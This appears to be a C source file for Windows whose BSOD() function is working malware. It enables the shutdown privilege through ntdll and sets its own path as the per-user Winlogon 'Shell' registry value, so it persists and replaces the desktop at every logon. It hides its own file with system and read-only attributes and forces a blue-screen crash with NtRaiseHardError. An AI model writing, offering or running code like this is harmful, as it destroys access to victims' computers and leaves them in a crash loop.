#include "Variables.h"

//Typedefs for BSOD() Function
typedef NTSTATUS(NTAPI* RtlAdjustPrivilegePtr)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* NtRaiseHardErrorPtr)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

int BSOD()
{
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");

	if (hNtdll == NULL)
	{
		return EXIT_FAILURE;
	}

	RtlAdjustPrivilegePtr RtlAdjustPrivilege = (RtlAdjustPrivilegePtr)GetProcAddress(hNtdll, "RtlAdjustPrivilege");

	if (RtlAdjustPrivilege == NULL)
	{
		FreeLibrary(hNtdll);
		return EXIT_FAILURE;
	}

	BOOLEAN enabled;

	if (RtlAdjustPrivilege(19, TRUE, FALSE, &enabled) != 0)
	{
		FreeLibrary(hNtdll);
		return EXIT_FAILURE;
	}

	NtRaiseHardErrorPtr NtRaiseHardError = (NtRaiseHardErrorPtr)GetProcAddress(hNtdll, "NtRaiseHardError");

	if (NtRaiseHardError == NULL)
	{
		FreeLibrary(hNtdll);
		return EXIT_FAILURE;
	}

	FreeLibrary(hNtdll);

	char szFilePath[MAX_PATH];
	GetModuleFileName(NULL, szFilePath, MAX_PATH);
	HKEY Key;

	if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &Key, NULL) == ERROR_SUCCESS)
	{
		RegSetValueEx(Key, TEXT("Shell"), 0, REG_SZ, (LPBYTE)szFilePath, sizeof(szFilePath));
	}

	RegCloseKey(Key);

	if (SetFileAttributesA(szFilePath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED | FILE_ATTRIBUTE_READONLY) == 0)
	{
		return EXIT_FAILURE;
	}

	ULONG response;

	if (RtlAdjustPrivilege(19, TRUE, FALSE, &enabled) == 0)
	{
		NtRaiseHardError(0xC0000022, 0, 0, NULL, 0b0110, &response);
	}

	else
	{
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}
